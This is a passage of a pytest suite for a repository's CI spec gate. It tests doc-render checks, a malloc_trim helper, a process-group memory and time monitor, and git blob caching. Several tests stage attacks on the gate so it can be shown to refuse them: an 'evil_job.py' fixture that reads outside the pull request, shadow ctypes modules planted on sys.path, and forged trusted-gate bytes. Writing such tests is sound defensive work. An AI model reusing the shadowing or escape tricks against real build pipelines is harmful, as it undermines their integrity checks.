        inside = pr(root, BRANCH, {MAIN_PY: moved_main(), "gcp/evil_job.py": outside.read_text(encoding="utf-8"),
                                   "gcp/deploy.sh": deploy + JOB.format("gcp/evil_job.py")}, then=render, **DOCS_OK)
        assert (refused(escaped, "read outside this pull request's files"), "evil_job.py" in escaped.stdout, inside.returncode) == (True, True, 0), \
            escaped.stdout + inside.stdout


def test_the_refused_heads_have_accepted_controls(inventory_repo):
    """FEAT-CICD-001 spec (done_when[1]): the controls for the clean-bytes and head-tree cases, each differing only in
    the condition under test, pass: the route without an escape, and a plain spliced entry."""
    if RENDERER_HERE:
        root, moved = inventory_repo
        route = pr(root, BRANCH, {MAIN_PY: moved_main() + ROUTE.format("")}, then=render, **DOCS_OK)   # Task 6's route, no escape
        change(root, BRANCH, moved)
        blob = subprocess.run(["git", "hash-object", "-w", "--stdin"], input="x", cwd=root, capture_output=True, text=True, check=True).stdout.strip()
        x = mktree(root, f"100644 blob {blob}\tx\n")
        b, h = spliced(root, f"040000 tree {x}\tok")   # Task 7's splice, a plain entry
        plain = gate(root, "--pr", b, h, PR_HEAD_REF=BRANCH, **DOCS_OK)
        assert (route.returncode, plain.returncode) == (0, 0), route.stdout + plain.stdout


def test_the_skill_names_the_inventory_allowance():
    """FEAT-CICD-001 spec, the allowance (done_when[7]): the product-delivery skill's "Never" list names the
    re-rendered inventory blocks as a change a feature branch may carry, and cites REQ-GOV-004."""
    skill = (REPO / ".claude/skills/product-delivery/SKILL.md").read_text(encoding="utf-8")
    never = next(line for line in skill.splitlines() if line.startswith("- Never edit `docs/product/` from a feature branch"))
    assert "REQ-GOV-004" in never and "re-rendered by `scripts/maintenance/doc_inventory.py`" in never, never
    assert "existing fixed renderer-owned count/as-of substitutions" in never, never
    assert all(name in never for name in ('05-a-ARCHITECTURE.md', '05-c-DATA_DEPENDENCIES.md', '05-e-API.md')), never

def test_inventory_budget_observer_keeps_cicd_ownership(repo):
    """An unrelated feature cannot replace the budget verdict; the actual CICD owner can."""
    ci_branch = "fix/feat-cicd-001-inventory-budget"
    ci_spec = "docs/superpowers/specs/2026-09-01-inventory-budget.md"
    ci_plan = "docs/superpowers/plans/2026-09-01-inventory-budget.md"
    ci_catalog = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\\n| [FEAT-DATA-001]", 1)
    on_base(repo, {CATALOG: ci_catalog, ci_spec: spec(feat_id="FEAT-CICD-001"),
                   ci_plan: plan(feat_id="FEAT-CICD-001", spec=ci_spec, branch=ci_branch)})
    payload = {"tests/scripts/measure_inventory_render.py": "print('actual fixture observer')\\n"}
    unrelated = pr(repo, BRANCH, payload, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body())
    owner = pr(repo, ci_branch, payload, PR_TITLE="FEAT-CICD-001: observer", PR_BODY=body(spec_path=ci_spec, plan_path=ci_plan))
    assert unrelated.returncode == 1 and "belong to FEAT-CICD-001" in unrelated.stdout, unrelated.stdout
    assert owner.returncode == 0, owner.stdout + owner.stderr


def complete_inventory_case(root: Path) -> dict[str, str]:
    """Real BASE prose with old counter/date shapes; unchanged renderer supplies every expected byte."""
    prose = ("\nDeclared: 999 runtime-created relations (999 tables, 999 materialized views, 999 views).\n"
             "Live 2001-02-03; read on **2001-02-03**; from the 2001-02-03 live snapshot.\n"
             "Historical correction: 2001-02-03. Neighbor: unchanged.\n")
    on_base(root, {d: _git(root, 'show', f'base:{d}') + prose for d in GENERATED})
    change(root, BRANCH, {MAIN_PY: moved_main(),
                          'gcp/schema.sql': RENDER_SOURCE['gcp/schema.sql'] + '\nCREATE TABLE new_observations (id INTEGER);\n'}, then=render)
    return {p: (root / p).read_text(encoding='utf-8') for p in (MAIN_PY, 'gcp/schema.sql', *GENERATED)}


def test_complete_inventory_renders_from_merge_base_prose(inventory_repo):
    """Full actual trusted output allows only BASE counter/asof shapes plus fresh HEAD source citations."""
    if RENDERER_HERE:
        root, _moved = inventory_repo
        expected = complete_inventory_case(root)
        assert all('999 runtime-created relations' not in expected[d] and '999 tables' not in expected[d]
                   and 'Live 2001-02-03' not in expected[d] and 'Historical correction: 2001-02-03.' in expected[d]
                   for d in GENERATED), expected
        r = pr(root, BRANCH, expected, **DOCS_OK)
        assert r.returncode == 0, r.stdout + r.stderr
        assert set(_git(root, 'diff', '--name-only', 'base', 'HEAD').splitlines()) == {MAIN_PY, 'gcp/schema.sql', *GENERATED}


def test_complete_inventory_refuses_non_renderer_prose(inventory_repo):
    """Each refused head differs from the actual accepted full render in exactly its named condition."""
    if RENDERER_HERE:
        root, _moved = inventory_repo
        expected = complete_inventory_case(root)
        text = expected[API_DOC]
        import re
        total = re.search(r'\d+ runtime-created relations', text).group(0)
        breakdown = re.search(r'\(\d+ tables?, \d+ materialized views?, \d+ views?\)', text).group(0)
        live = re.search(r'Live \d{4}-\d{2}-\d{2}', text).group(0)
        cases = {
            'wrong total': edit(text, total, '999 runtime-created relations'),
            'wrong breakdown': edit(text, breakdown, '(999 tables, 999 materialized views, 999 views)'),
            'wrong snapshot date': edit(text, live, 'Live 2001-02-03'),
            'neighbor': edit(text, 'Neighbor: unchanged.', 'Neighbor: changed.'),
            'historical date': edit(text, 'Historical correction: 2001-02-03.', 'Historical correction: 2002-03-04.'),
            'new count pattern': text + '\n999 runtime-created relations\n',
            'new asof pattern': text + '\nLive 2001-02-03\n',
            'same-valued new pattern': text + '\n' + total + '\n' + live + '\n',
        }
        control = pr(root, BRANCH, expected, **DOCS_OK)
        results = {name: pr(root, BRANCH, {**expected, API_DOC: changed}, **DOCS_OK) for name, changed in cases.items()}
        assert control.returncode == 0, control.stdout + control.stderr
        assert all(refused(r, "differs from main's render") for r in results.values()), {
            name: r.stdout + r.stderr for name, r in results.items() if not refused(r, "differs from main's render")}


class FakeTrim:
    """Stands in for a ctypes foreign function: records the ABI declared on it and every call."""
    def __init__(self, result: int | None = None, error: BaseException | None = None):
        self.result, self.error, self.calls = result, error, []

    def __call__(self, *args):
        self.calls.append((args, self.argtypes, self.restype))
        if self.error is not None:
            raise self.error
        return self.result


class FrozenTrim(FakeTrim):
    """A foreign function whose ABI cannot be declared."""
    def __setattr__(self, name, value):
        if name in ("argtypes", "restype"):
            raise TypeError(f"{name} cannot be set")
        super().__setattr__(name, value)


class RaisingLib:
    """A loaded library whose symbol lookup raises `error`, recording each name looked up in `asked`."""
    def __init__(self, error: BaseException):
        self.error, self.asked = error, []

    def __getattr__(self, name):
        self.asked.append(name)
        raise self.error


class NoCDLL:
    """A loaded `ctypes` without CDLL, recording each missing name asked for in `asked`."""
    c_size_t, c_int = ctypes.c_size_t, ctypes.c_int

    def __init__(self):
        self.asked = []

    def __getattr__(self, name):
        if not name.startswith("__"):
            self.asked.append(name)
        raise AttributeError(name)


class RenderOrder:
    """Wraps subprocess.run and records each start of the render child in `order`."""
    def __init__(self, gate: types.ModuleType, order: list[str]):
        self.gate, self.order, self.real = gate, order, subprocess.run

    def __call__(self, command, *args, **kwargs):
        if self.gate.RENDER_MODE in command:
            self.order.append("render")
        return self.real(command, *args, **kwargs)


def fake_ctypes(*, lib=None, load_error: BaseException | None = None, loads: list | None = None) -> types.SimpleNamespace:
    """A loaded `ctypes` whose CDLL records its argument, then raises `load_error` or returns `lib`."""
    def CDLL(name):
        if loads is not None:
            loads.append(name)
        if load_error is not None:
            raise load_error
        return lib
    return types.SimpleNamespace(CDLL=CDLL, c_size_t=ctypes.c_size_t, c_int=ctypes.c_int)


def release_with(gate: types.ModuleType, monkeypatch, module, platform: str = "linux"):
    """The helper's answer with `module` as the loaded ctypes on `platform`."""
    monkeypatch.setattr(sys, "platform", platform)
    monkeypatch.setitem(sys.modules, "ctypes", module)
    return gate.release_freed_heap()


def trim_once(gate: types.ModuleType, monkeypatch, returned: int) -> tuple[bool, list, list]:
    """(answer, CDLL arguments, malloc_trim calls with the ABI declared at each) when malloc_trim returns `returned`."""
    trim, loads = FakeTrim(result=returned), []
    answer = release_with(gate, monkeypatch, fake_ctypes(lib=types.SimpleNamespace(malloc_trim=trim), loads=loads))
    return answer, loads, trim.calls


def off_linux(gate: types.ModuleType, monkeypatch, platform: str) -> tuple[bool, list, list]:
    """(answer, CDLL arguments, malloc_trim calls) on `platform`, with a ctypes whose CDLL(None) raises TypeError as
    it can on Windows."""
    trim, loads = FakeTrim(result=1), []
    module = fake_ctypes(lib=types.SimpleNamespace(malloc_trim=trim), load_error=TypeError("CDLL(None)"), loads=loads)
    return release_with(gate, monkeypatch, module, platform), loads, trim.calls


@pytest.fixture(scope="module")
def heap_gate() -> types.ModuleType:
    """This checkout's gate, for the allocator helper's own tests, which read no repository."""
    return load_gate(REPO)


def test_release_freed_heap_imports_nothing_when_ctypes_is_not_loaded(heap_gate, tmp_path, monkeypatch):
    """With ctypes not loaded and a root first on sys.path holding ctypes.py and _ctypes.py (maintenance_modules puts
    ROOT first on the CLI path), the helper does nothing and executes neither shadow, although an import would have
    found them first."""
    shadow = tmp_path / "root"
    shadow.mkdir()
    for name in ("ctypes", "_ctypes"):
        ran = tmp_path / f"{name}.ran"
        (shadow / f"{name}.py").write_text(f"import pathlib\npathlib.Path({str(ran)!r}).write_text('ran')\n")
    monkeypatch.setattr(sys, "platform", "linux")
    for name in [m for m in sys.modules if m in ("ctypes", "_ctypes") or m.startswith("ctypes.")]:
        monkeypatch.delitem(sys.modules, name)
    monkeypatch.syspath_prepend(str(shadow))
    for name in ("ctypes", "_ctypes"):
        if name not in sys.builtin_module_names:
            assert importlib.util.find_spec(name).origin == str(shadow / f"{name}.py"), name
    assert heap_gate.release_freed_heap() is False
    assert sorted(p.name for p in tmp_path.glob("*.ran")) == []
    assert "ctypes" not in sys.modules and "_ctypes" not in sys.modules


def test_release_freed_heap_calls_int_malloc_trim_size_t_with_pad_zero(heap_gate, monkeypatch):
    """glibc's `int malloc_trim(size_t pad)`: looked up in the process's own symbols (CDLL(None)), declared with exactly
    that ABI before the call, and called once with pad 0; a 1 from it is read as True."""
    answer, loads, calls = trim_once(heap_gate, monkeypatch, 1)
    assert answer is True and loads == [None] and calls == [((0,), (ctypes.c_size_t,), ctypes.c_int)]


def test_release_freed_heap_reads_a_zero_from_malloc_trim_as_nothing_released(heap_gate, monkeypatch):
    """0 from malloc_trim means there was nothing to release, which is not an error: False, after the same one call."""
    answer, loads, calls = trim_once(heap_gate, monkeypatch, 0)
    assert answer is False and loads == [None] and calls == [((0,), (ctypes.c_size_t,), ctypes.c_int)]


def test_release_freed_heap_reads_only_a_one_from_malloc_trim_as_released(heap_gate, monkeypatch):
    """Only 1 reads as True: any other value from malloc_trim (2, -1) reads as False, after the same one call."""
    for returned in (2, -1):
        answer, loads, calls = trim_once(heap_gate, monkeypatch, returned)
        assert answer is False and loads == [None] and calls == [((0,), (ctypes.c_size_t,), ctypes.c_int)], returned


def test_release_freed_heap_calls_the_real_symbol_when_ctypes_is_loaded(heap_gate, monkeypatch):
    """With the real ctypes loaded, a glibc Linux process runs against its real C library without error and gets a
    bool (that the call is made, with pad 0 and the declared ABI, is shown by the stand-in tests above, not here); a
    process without malloc_trim, or off Linux, gets False."""
    monkeypatch.setitem(sys.modules, "ctypes", ctypes)
    released = heap_gate.release_freed_heap()
    if sys.platform == "linux" and hasattr(ctypes.CDLL(None), "malloc_trim"):
        assert released in (True, False) and type(released) is bool
    else:
        assert released is False


def test_release_freed_heap_does_nothing_when_the_c_library_cannot_be_loaded(heap_gate, monkeypatch):
    """An OSError from loading the C library is one of the two failures it turns into doing nothing."""
    loads = []
    assert release_with(heap_gate, monkeypatch, fake_ctypes(load_error=OSError("no C library"), loads=loads)) is False
    assert loads == [None]


def test_release_freed_heap_does_nothing_when_the_c_library_has_no_malloc_trim(heap_gate, monkeypatch):
    """An AttributeError from looking up malloc_trim is the other failure it turns into doing nothing."""
    loads = []
    assert release_with(heap_gate, monkeypatch, fake_ctypes(lib=types.SimpleNamespace(), loads=loads)) is False
    assert loads == [None]


def test_release_freed_heap_does_nothing_on_windows(heap_gate, monkeypatch):
    """Off Linux it returns before any native lookup or call (on Windows, CDLL(None) can raise TypeError)."""
    assert off_linux(heap_gate, monkeypatch, "win32") == (False, [], [])


def test_release_freed_heap_does_nothing_on_cygwin(heap_gate, monkeypatch):
    """Cygwin is not Linux: no lookup, no call."""
    assert off_linux(heap_gate, monkeypatch, "cygwin") == (False, [], [])


def test_release_freed_heap_does_nothing_on_macos(heap_gate, monkeypatch):
    """macOS is not Linux: no lookup, no call."""
    assert off_linux(heap_gate, monkeypatch, "darwin") == (False, [], [])


def test_release_freed_heap_does_nothing_on_freebsd(heap_gate, monkeypatch):
    """FreeBSD is not Linux: no lookup, no call."""
    assert off_linux(heap_gate, monkeypatch, "freebsd14") == (False, [], [])


def test_release_freed_heap_does_nothing_on_emscripten(heap_gate, monkeypatch):
    """Emscripten is not Linux: no lookup, no call."""
    assert off_linux(heap_gate, monkeypatch, "emscripten") == (False, [], [])


def test_release_freed_heap_does_nothing_on_wasi(heap_gate, monkeypatch):
    """WASI is not Linux: no lookup, no call."""
    assert off_linux(heap_gate, monkeypatch, "wasi") == (False, [], [])


def test_release_freed_heap_lets_an_interrupt_while_loading_propagate(heap_gate, monkeypatch):
    """An interrupt while the C library loads is not swallowed."""
    loads = []
    with pytest.raises(KeyboardInterrupt):
        release_with(heap_gate, monkeypatch, fake_ctypes(load_error=KeyboardInterrupt(), loads=loads))
    assert loads == [None]


def test_release_freed_heap_lets_a_type_error_while_loading_propagate(heap_gate, monkeypatch):
    """On Linux a TypeError from CDLL(None) is unexpected and is not swallowed."""
    loads = []
    with pytest.raises(TypeError):
        release_with(heap_gate, monkeypatch, fake_ctypes(load_error=TypeError("CDLL(None)"), loads=loads))
    assert loads == [None]


def test_release_freed_heap_lets_a_loaded_ctypes_without_cdll_propagate(heap_gate, monkeypatch):
    """An AttributeError from the loaded ctypes itself (no CDLL) is unexpected setup, not a missing symbol."""
    module = NoCDLL()
    with pytest.raises(AttributeError):
        release_with(heap_gate, monkeypatch, module)
    assert module.asked == ["CDLL"]


def test_release_freed_heap_lets_another_symbol_lookup_failure_propagate(heap_gate, monkeypatch):
    """A lookup failure other than AttributeError is not swallowed."""
    lib, loads = RaisingLib(RuntimeError("lookup")), []
    with pytest.raises(RuntimeError):
        release_with(heap_gate, monkeypatch, fake_ctypes(lib=lib, loads=loads))
    assert loads == [None] and lib.asked == ["malloc_trim"]


def test_release_freed_heap_lets_an_interrupt_during_symbol_lookup_propagate(heap_gate, monkeypatch):
    """An interrupt during the symbol lookup is not swallowed."""
    lib, loads = RaisingLib(KeyboardInterrupt()), []
    with pytest.raises(KeyboardInterrupt):
        release_with(heap_gate, monkeypatch, fake_ctypes(lib=lib, loads=loads))
    assert loads == [None] and lib.asked == ["malloc_trim"]


def test_release_freed_heap_lets_an_abi_that_cannot_be_declared_propagate(heap_gate, monkeypatch):
    """A failure to declare argtypes or restype is not swallowed, and nothing is called."""
    trim = FrozenTrim(result=1)
    with pytest.raises(TypeError):
        release_with(heap_gate, monkeypatch, fake_ctypes(lib=types.SimpleNamespace(malloc_trim=trim)))
    assert trim.calls == []


def test_release_freed_heap_lets_a_native_call_error_propagate(heap_gate, monkeypatch):
    """An error from the native call itself is not swallowed."""
    trim = FakeTrim(error=ctypes.ArgumentError("argument 1"))
    with pytest.raises(ctypes.ArgumentError):
        release_with(heap_gate, monkeypatch, fake_ctypes(lib=types.SimpleNamespace(malloc_trim=trim)))
    assert trim.calls == [((0,), (ctypes.c_size_t,), ctypes.c_int)]


def test_release_freed_heap_lets_an_interrupt_during_the_native_call_propagate(heap_gate, monkeypatch):
    """An interrupt during the native call is not swallowed."""
    trim = FakeTrim(error=KeyboardInterrupt())
    with pytest.raises(KeyboardInterrupt):
        release_with(heap_gate, monkeypatch, fake_ctypes(lib=types.SimpleNamespace(malloc_trim=trim)))
    assert trim.calls == [((0,), (ctypes.c_size_t,), ctypes.c_int)]


def test_the_render_verdict_is_the_same_whether_the_heap_was_released(inventory_repo, monkeypatch):
    """The actual renderer still runs, once per render and after the helper, and gives the same acceptance and the
    same refusal whether the helper reports True or False."""
    if RENDERER_HERE:
        root, _moved = inventory_repo
        gate = load_gate(root)
        assert callable(getattr(gate, "release_freed_heap", None)), "the fixture's gate copy has no helper"
        docs = list(gate.GENERATED_DOCS)
        base = gate.Tree(_git(root, "rev-parse", "base"))
        base_docs = {doc: base.raw(doc) for doc in docs}
        _git(root, "checkout", "-q", "-b", "hand", "base")
        write(root, API_DOC, edit((root / API_DOC).read_text(encoding="utf-8"), "Liveness probe:", "Liveness probe, hand-edited:"))
        _git(root, "commit", "-q", "-am", "hand edit")
        heads = {"accepted": _git(root, "rev-parse", "base"), "refused": _git(root, "rev-parse", "HEAD")}
        order, results = [], {}
        monkeypatch.setattr(gate.subprocess, "run", RenderOrder(gate, order))
        for released in (True, False):
            monkeypatch.setattr(gate, "release_freed_heap", lambda released=released: order.append("trim") or released)
            for name, head in heads.items():
                evidence = {}
                refusals = gate.render_refusals(gate.head_entries(head), docs, base_docs, evidence=evidence)
                results[released, name] = (refusals, evidence["exit"])
        assert order == ["trim", "render"] * 4, order
        assert results[True, "accepted"] == results[False, "accepted"] == ([], 0), results
        assert results[True, "refused"] == results[False, "refused"], results
        assert results[True, "refused"][1] == gate.RENDER_DIFFERS, results
        assert any("differs from main's render" in r for r in results[True, "refused"][0]), results


def test_a_differs_exit_without_a_whole_finding_is_a_failed_render(inventory_repo, monkeypatch):
    """RENDER_DIFFERS with no output, or with a line that is not doc, block and difference, is refused as a failed
    render, never accepted and never a crash (#1700 pass 33 R4 F1)."""
    if RENDERER_HERE:
        root, _moved = inventory_repo
        gate = load_gate(root)
        docs = list(gate.GENERATED_DOCS)
        base = gate.Tree(_git(root, "rev-parse", "base"))
        base_docs = {doc: base.raw(doc) for doc in docs}
        entries = gate.head_entries(_git(root, "rev-parse", "base"))
        for stdout in ("", "one field\n", "two\tfields\n", f"{docs[0]}\tblock\tdiff\nstray\n"):
            monkeypatch.setattr(gate.subprocess, "run", lambda command, stdout=stdout, **kw:
                                subprocess.CompletedProcess(command, gate.RENDER_DIFFERS, stdout, ""))
            refusals = gate.render_refusals(entries, docs, base_docs)
            assert len(refusals) == 1 and "renderer failed" in refusals[0] and "(exit 3)" in refusals[0], (stdout, refusals)

MEASURE = 'tests/scripts/measure_inventory_render.py'


def measurement(root: Path, *args: str) -> tuple[subprocess.CompletedProcess, dict]:
    r = subprocess.run([sys.executable, str(root / MEASURE), *args], cwd=root, capture_output=True, text=True)
    return r, json.loads(r.stdout) if r.stdout.strip().startswith('{') else {}


def test_measure_inventory_render_runs_the_actual_gate(inventory_repo):
    """Actual committed-tree CLI uses real trusted gate; uncommitted application bytes are not its source."""
    if RENDERER_HERE:
        root, _moved = inventory_repo
        assert (REPO / MEASURE).is_file(), 'approved standalone observer is missing'
        on_base(root, {MEASURE: (REPO / MEASURE).read_text(encoding='utf-8')})
        # A path with spaces travels through real argv, not shell interpolation.
        spaced = root.parent / 'render repository with spaces'
        root.rename(spaced); root = spaced
        write(root, MAIN_PY, 'raise RuntimeError("dirty worktree must not run")\n')
        r, report = measurement(root, '--ref', 'base', '--max-rss-mib', '512', '--max-seconds', '10', '--output', str(root.parent/'accepted-output.json'))
        assert r.returncode == 0 and report['kind'] == 'committed-inventory-render', r.stdout + r.stderr
        assert json.loads((root.parent/'accepted-output.json').read_text()) == report
        assert report['worker']['ref'] == _git(root, 'rev-parse', 'base') and report['worker']['renderer_exit'] == 0
        assert report['worker']['source_bytes'] > 0 and report['worker']['source_entries'] > 10
        assert Path(report['worker']['renderer_argv'][5]).is_absolute() and 'spec-gate-render-' in report['worker']['renderer_argv'][5]
        assert report['worker']['renderer_cwd'] and all('<owned' not in arg for arg in report['worker']['renderer_argv'])
        assert report['sample_count'] > 1 and report['peak_rss_bytes'] >= report['monitor_rss_bytes'] > 0
        assert report['sample_gap_seconds']['max'] > 0 and report['discovery_gap_seconds']['max'] > 0
        assert report['kernel_child_peak_bytes'] > 0 and report['owned_group_gone']
        for option, value in [('--max-rss-mib','513'),('--max-seconds','61'),('--max-seconds','nan'),
                              ('--max-rss-mib','0'),('--max-seconds','true')]:
            bad, _ = measurement(root, '--ref', 'base', option, value)
            assert bad.returncode != 0, (option, value, bad.stdout)
        # Trust checking is independent of the committed app tree and rejects forged observer/gate bytes.
        write(root, 'scripts/gate/spec_gate.py', (root / 'scripts/gate/spec_gate.py').read_text() + '\n# forged trusted helper\n')
        bad, evidence = measurement(root, '--ref', 'base', '--max-seconds', '10')
        assert bad.returncode != 0 and not evidence['ok'] and 'trusted input differs' in evidence['stderr'], bad.stdout + bad.stderr
        # An unchanged helper cannot turn an actual renderer parse/refusal into a budget success.
        on_base(root, {MAIN_PY: RENDER_SOURCE[MAIN_PY] + '\ndef invalid(:\n'})
        bad, evidence = measurement(root, '--ref', 'base', '--max-seconds', '10')
        assert bad.returncode != 0 and evidence['worker']['renderer_exit'] != 0, bad.stdout + bad.stderr
        assert 'SyntaxError' in '\n'.join(evidence['worker']['refusals']) and evidence['owned_group_gone']
        on_base(root, {MAIN_PY: RENDER_SOURCE[MAIN_PY], SNAPSHOT_FILE: None})
        bad, evidence = measurement(root, '--ref', 'base', '--max-seconds', '10')
        assert bad.returncode != 0 and not evidence['ok'] and evidence['owned_group_gone'], bad.stdout + bad.stderr
        # Source identity covers the observer itself, independently of gate identity.
        on_base(root, {SNAPSHOT_FILE: (REPO / SNAPSHOT_FILE).read_text(encoding='utf-8')})
        write(root, MEASURE, (root / MEASURE).read_text() + '\n# changed trusted monitor\n')
        bad, evidence = measurement(root, '--ref', 'base', '--max-seconds', '10')
        assert bad.returncode != 0 and 'trusted input differs' in evidence['stderr'], bad.stdout + bad.stderr


def bounded_measurement(tmp_path: Path, code: str, *, mib: int = 128, seconds: float = 2) -> dict:
    """Run the actual private monitor in a fresh process, with actual harmless owned child groups."""
    assert (REPO / MEASURE).is_file(), 'approved standalone observer is missing'
    launcher = (
        "import importlib.util,json,pathlib,sys; "
        "s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]); "
        "m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m); "
        "r=m.run_bounded([sys.executable,'-c',sys.argv[2]],pathlib.Path(sys.argv[3]),"
        "max_rss_bytes=int(sys.argv[4]),max_seconds=float(sys.argv[5]));print(json.dumps(r))"
    )
    r = subprocess.run([sys.executable,'-c',launcher,str(REPO / MEASURE),code,str(tmp_path),str(mib*1024*1024),str(seconds)],
                       capture_output=True,text=True,timeout=10)
    assert r.returncode == 0, r.stdout + r.stderr
    return json.loads(r.stdout)


def test_measure_inventory_render_real_memory_refusal(tmp_path):
    """A sustained actual allocation, not a mocked sample, crosses a lowered combined monitor/group cap."""
    good = bounded_measurement(tmp_path, 'import time; a=bytearray(1024*1024);time.sleep(.2)', mib=64)
    bad = bounded_measurement(tmp_path, 'import time; a=bytearray(96*1024*1024);time.sleep(2)', mib=64)
    assert good['ok'] and good['owned_group_gone'], good
    assert not bad['ok'] and bad['reason'] == 'rss_limit' and bad['peak_rss_bytes'] > 64*1024*1024, bad
    assert bad['owned_group_gone'] and bad['monitor_rss_bytes'] > 0 and bad['sample_count'] > 1


def test_measure_inventory_render_real_timeout_reaps_group(tmp_path):
    """Actual parent+grandchild outlive lowered deadline; entire owned group is killed and reaped."""
    pidfile = tmp_path / 'owned-pids.json'
    code = ("import json,os,subprocess,sys,time; "
            "p=subprocess.Popen([sys.executable,'-c','import time;time.sleep(20)']); "
            f"open({str(pidfile)!r},'w').write(json.dumps([os.getpid(),p.pid]));time.sleep(20)")
    bad = bounded_measurement(tmp_path, code, seconds=1)
    pids = json.loads(pidfile.read_text())
    assert not bad['ok'] and bad['reason'] == 'time_limit' and bad['owned_group_gone'], bad
    assert all(not Path(f'/proc/{p}').exists() for p in pids), (pids, bad)
    good = bounded_measurement(tmp_path, 'import time;time.sleep(.05)', seconds=1)
    nonzero = bounded_measurement(tmp_path, 'raise SystemExit(7)')
    assert good['ok'] and good['owned_group_gone'], good
    assert not nonzero['ok'] and nonzero['worker_exit'] == 7 and nonzero['owned_group_gone'], nonzero


def test_measure_inventory_render_refuses_unavailable_proc(tmp_path):
    """Missing actual observation files refuse before creating a child; no assumed RSS pass."""
    assert (REPO / MEASURE).is_file()
    launch = ("import importlib.util,json,pathlib,sys; "
              "s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]); "
              "m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m); "
              "m.PROC=pathlib.Path(sys.argv[2]); "
              "print(json.dumps(m.run_bounded([sys.executable,'-c','pass'],pathlib.Path.cwd(),"
              "max_rss_bytes=128*1024*1024,max_seconds=1)))")
    r = subprocess.run([sys.executable,'-c',launch,str(REPO / MEASURE),str(tmp_path/'absent-proc')],
                       capture_output=True,text=True,timeout=5)
    evidence = json.loads(r.stdout)
    assert r.returncode == 0 and not evidence['ok'] and evidence['reason'] == 'observation_failure', r.stdout + r.stderr
    assert 'process_group' not in evidence and evidence['sample_count'] == 0


class _OneBlobShowFailure:
    """Fail one transport operation, then delegate every call to actual git."""
    def __init__(self, run):
        self.run, self.failed = run, False

    def __call__(self, args, *a, **kw):
        if not self.failed and "show" in args and any(str(x).endswith(":lib/recovery.py") for x in args):
            self.failed = True
            return subprocess.CompletedProcess(args, 128, b"", b"transient object read failure")
        return self.run(args, *a, **kw)


def test_committed_blob_cache_keeps_mutable_refs_index_and_failures_fresh(repo, monkeypatch):
    """Revision reads preserve mutation/error behavior without stale ref or failure retention."""
    sg = load_gate(repo)
    original = _git(repo, "rev-parse", "base")
    immutable, moving = sg.Tree(original), sg.Tree("base")
    assert immutable.raw("lib/model.py") == b"DECISION = 'size'\n"
    assert moving.raw("lib/model.py") == b"DECISION = 'size'\n"
    on_base(repo, {"lib/model.py": "DECISION = 'new'\r\n"})
    assert moving.raw("lib/model.py") == b"DECISION = 'new'\r\n"
    assert moving.read("lib/model.py") == "DECISION = 'new'\n"
    assert immutable.raw("lib/model.py") == b"DECISION = 'size'\n"
    index, worktree = sg.Tree(None), sg.Tree(sg.WORKTREE)
    assert index.raw("lib/model.py") == b"DECISION = 'new'\r\n"
    write(repo, "lib/model.py", "unstaged\n")
    assert worktree.raw("lib/model.py") == b"unstaged\n"
    _git(repo, "add", "lib/model.py")
    assert index.raw("lib/model.py") == b"unstaged\n"
    write(repo, "lib/model.py", "another unstaged\n")
    assert worktree.raw("lib/model.py") == b"another unstaged\n"
    assert index.raw("lib/model.py") == b"unstaged\n"

    # A transient git-show failure cannot become cached absence. Recover through
    # the SAME Tree and real git; the new path has no preexisting cached value.
    on_base(repo, {"lib/recovery.py": "RECOVERED = True\n", "lib/empty.py": ""})
    recovered = sg.Tree(_git(repo, "rev-parse", "base"))
    transient = _OneBlobShowFailure(sg.subprocess.run)
    monkeypatch.setattr(sg.subprocess, "run", transient)
    assert recovered.raw("lib/recovery.py") is None
    assert recovered.raw("lib/recovery.py") == b"RECOVERED = True\n"
    assert transient.failed
    assert recovered.raw("lib/empty.py") == b"", "Empty committed bytes are not an absent path"
    assert recovered.raw("lib/missing.py") is None, "An actually absent path remains unavailable"


class _PolicyBatchTransportFailure:
    """Fail the actual batched transport; keep test bodies free of suite exits."""
    def __init__(self, run):
        self.run = run

    def __call__(self, args, *a, **kw):
        if "cat-file" in args:
            return subprocess.CompletedProcess(args, 128, b"", b"transient batch transport failure")
        return self.run(args, *a, **kw)


def test_fresh_policy_batch_preserves_bytes_absence_replace_root_and_errors(repo, tmp_path, monkeypatch):
    """Actual immutable-policy reads stay fresh across replacements, roots and Git failures."""
    # Earlier in-process docs_audit.main() calls intentionally disable replacements.
    # This fixture explicitly exercises enabled replacement refs, then both modes.
    monkeypatch.delenv("GIT_NO_REPLACE_OBJECTS", raising=False)
    sg = load_gate(repo)
    mixed = b"first\r\nnext\rlast\x00\xff\n"
    on_base(repo, {CATALOG: "placeholder", TRACEABILITY: ""},
            then=lambda root: (root / CATALOG).write_bytes(mixed))
    original = _git(repo, "rev-parse", "base")
    queries = [(original, CATALOG), (original, TRACEABILITY)]
    assert sg.policy_blob_bytes(queries) == [mixed, b""]
    assert sg.close_out_policy(queries) == [sg.Tree(original).read(CATALOG), ""]
    on_base(repo, {CATALOG: "replacement\n", TRACEABILITY: None})
    replacement = _git(repo, "rev-parse", "base")
    assert sg.policy_blob_bytes([(replacement, TRACEABILITY)]) == [None]
    _git(repo, "replace", original, replacement)
    with monkeypatch.context() as disabled:
        disabled.setenv("GIT_NO_REPLACE_OBJECTS", "1")
        assert sg.policy_blob_bytes(queries) == [mixed, b""]
        assert [sg.Tree(original).raw(path) for _, path in queries] == [mixed, b""]
    assert sg.policy_blob_bytes(queries) == [b"replacement\n", None]
    other = tmp_path / "other"
    shutil.copytree(repo, other)
    on_base(other, {CATALOG: "other repository\n"})
    _git(other, "replace", "-f", original, _git(other, "rev-parse", "base"))
    monkeypatch.setattr(sg, "ROOT", other)
    assert sg.policy_blob_bytes(queries) == [b"other repository\n", None]
    monkeypatch.setattr(sg, "ROOT", repo)
    assert sg.policy_blob_bytes(queries) == [b"replacement\n", None]
    _git(repo, "replace", "-d", original)
    assert sg.policy_blob_bytes(queries) == [mixed, b""]

    real_run = sg.subprocess.run
    monkeypatch.setattr(sg.subprocess, "run", _PolicyBatchTransportFailure(real_run))
    with pytest.raises(sg.GitFailed, match="transient batch transport failure"):
        sg.policy_blob_bytes(queries)
    monkeypatch.setattr(sg.subprocess, "run", real_run)
    assert sg.policy_blob_bytes(queries) == [mixed, b""]
    with pytest.raises(sg.GitFailed, match="commit"):
